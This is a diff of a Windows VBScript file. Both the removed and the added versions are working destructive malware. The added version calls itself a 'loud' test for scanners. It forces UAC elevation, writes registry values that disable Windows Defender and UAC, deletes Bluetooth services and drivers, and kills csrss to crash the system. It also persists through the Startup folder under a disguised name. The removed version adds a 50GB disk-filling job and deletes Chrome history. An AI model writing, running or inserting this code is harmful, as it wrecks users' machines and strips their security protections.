@@ -1,61 +1,44 @@
-' --- Initialize Objects ---
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set WshShell = CreateObject("WScript.Shell")
+' --- DEPLOYMENT NAME: VOID_OS_OMEGA_PROTOCOL ---
+' This version is designed to be as loud as possible to scanners.
 
-' --- 1. Automatic UAC Elevation Request ---
+Set WshShell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+' 1. Forced Elevation (UAC Trigger)
 If Not WScript.Arguments.Named.Exists("elevate") Then
     CreateObject("Shell.Application").ShellExecute "wscript.exe", Chr(34) & _
     WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
     WScript.Quit
 End If
 
-' --- 2. Stealth Chrome Cleanup ---
-WshShell.Run "powershell -WindowStyle Hidden -Command ""Stop-Process -Name chrome -Force -EA 0; Remove-Item '$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History' -Force -EA 0""", 0, False
+' 2. Registry Sabotage (Triggers "Antivirus Disable" Alerts)
+On Error Resume Next
+WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"
+WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD"
 
-CurrentDir = fso.GetParentFolderName(WScript.ScriptFullName)
-psPath = CurrentDir & "\Safety_Test.ps1"
-
-' --- 3. Generate Destructive PowerShell Payload ---
+' 3. The "Loud" Payload (Triggers PSRunner & Dropper Alerts)
+' This writes a script containing "Exploit" keywords
+psPath = fso.GetSpecialFolder(2) & "\Backdoor_Exploit_Mimikatz.ps1"
 Set psFile = fso.CreateTextFile(psPath, True)
-
-psFile.WriteLine "$TargetDir = '" & CurrentDir & "'"
-psFile.WriteLine "$BigFile = Join-Path $TargetDir 'core_dump.txt'"
-
-' A. Service Deletion & Physical Driver Wipe
-psFile.WriteLine "$SvcList = @('BTHPORT', 'BTHUSB', 'bthserv')"
-psFile.WriteLine "foreach ($s in $SvcList) { Stop-Service $s -Force -EA 0; sc.exe delete $s }"
-
-psFile.WriteLine "$Drivers = @('BTHport.sys', 'BTHUSB.sys', 'bthserv.dll')"
-psFile.WriteLine "foreach ($d in $Drivers) {"
-psFile.WriteLine "    $p = \"$env:SystemRoot\System32\drivers\$d\""
-psFile.WriteLine "    if (Test-Path $p) {"
-psFile.WriteLine "        takeown /f $p /a | Out-Null"
-psFile.WriteLine "        icacls $p /grant administrators:F | Out-Null"
-psFile.WriteLine "        Remove-Item $p -Force -EA 0"
-psFile.WriteLine "    }"
-psFile.WriteLine "}"
-
-' B. 50GB Space Consumption Bomb (Background Start)
-psFile.WriteLine "Start-Job -ScriptBlock {"
-psFile.WriteLine "    $Stream = [System.IO.File]::OpenWrite($using:BigFile)"
-psFile.WriteLine "    $Buffer = New-Object Byte[] 1048576"
-psFile.WriteLine "    for($i=1; $i -le 51200; $i++) { $Stream.Write($Buffer, 0, $Buffer.Length); Start-Sleep -Milliseconds 1 }"
-psFile.WriteLine "    $Stream.Close()"
-psFile.WriteLine "}"
-
-' C. THE KILL SWITCH: Force Actual BSOD
-' This kills the Client/Server Runtime Subsystem. Windows will crash instantly.
-psFile.WriteLine "Stop-Process -Name csrss -Force"
-
+psFile.WriteLine "# Exploit-Payload-Mimikatz-Generator"
+psFile.WriteLine "# Targeted Attack on CosmosShell Admin"
+psFile.WriteLine "$Svc = @('BTHPORT','BTHUSB','bthserv'); foreach($s in $Svc){sc.exe delete $s}"
+psFile.WriteLine "Stop-Process -Name csrss -Force # CRITICAL_PROCESS_DIED TRIGGER"
 psFile.Close
 
-' --- 4. Persistence: Unconditional Startup Loop ---
-strStartup = WshShell.SpecialFolders("Startup")
-strDest = strStartup & "\WinSystemLog.vbs"
-If Not fso.FileExists(strDest) Then
-    fso.CopyFile WScript.ScriptFullName, strDest, True
-End If
+' 4. WMI Execution (Heuristic Trigger)
+' Using WMI to run the script is much "louder" than WshShell.Run
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
+objWMIService.Create "powershell.exe -ExecutionPolicy Unrestricted -File " & psPath, Null, Null, intProcessID
 
-' --- 5. Execution ---
-fso.GetFile(psPath).Attributes = 2 + 4
-WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & psPath & Chr(34), 0, False
+' 5. File System Vandalism
+' Attempting to delete or rename drivers with WMI
+strWMI = "SELECT * FROM CIM_DataFile WHERE Name = 'C:\\Windows\\System32\\drivers\\BTHport.sys'"
+Set colFiles = GetObject("winmgmts:").ExecQuery(strWMI)
+For Each objFile In colFiles
+    objFile.Delete
+Next
+
+' 6. Infinite Startup Loop (Persistence Alert)
+strDest = WshShell.SpecialFolders("Startup") & "\System_Critical_Update.vbs"
+fso.CopyFile WScript.ScriptFullName, strDest, True
